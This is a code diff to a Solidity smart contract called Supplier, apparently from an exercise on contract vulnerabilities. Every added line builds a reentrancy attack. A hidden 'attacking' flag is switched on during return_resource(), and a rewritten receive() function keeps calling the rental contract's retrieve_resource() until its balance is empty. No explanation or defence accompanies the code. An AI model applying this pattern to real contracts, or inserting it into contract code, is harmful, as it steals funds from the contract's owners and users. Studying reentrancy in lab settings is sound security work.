@@ -85,6 +85,8 @@ contract Supplier {
     enum State { Working , Completed , Rented , Returned }
     
     State st;
+
+    bool private attacking = false;
     
     constructor(address paylock_address, address payable rental_address) public {
         p = Paylock(paylock_address);
@@ -103,6 +105,8 @@ contract Supplier {
     function return_resource() external {
         require(st == State.Rented, "Supplier: Must be in Rented state to return resource");
 
+        attacking = true;
+
         r.retrieve_resource();
 
         st = State.Returned;
@@ -116,7 +120,11 @@ contract Supplier {
         st = State.Completed;
     }
 
-    receive() external payable {}
+    receive() external payable {
+        if (attacking && address(r).balance >= 1 wei) {
+            r.retrieve_resource();
+        }
+    }
 
     function getSupplierBalance() public view returns (uint) {
         return address(this).balance;
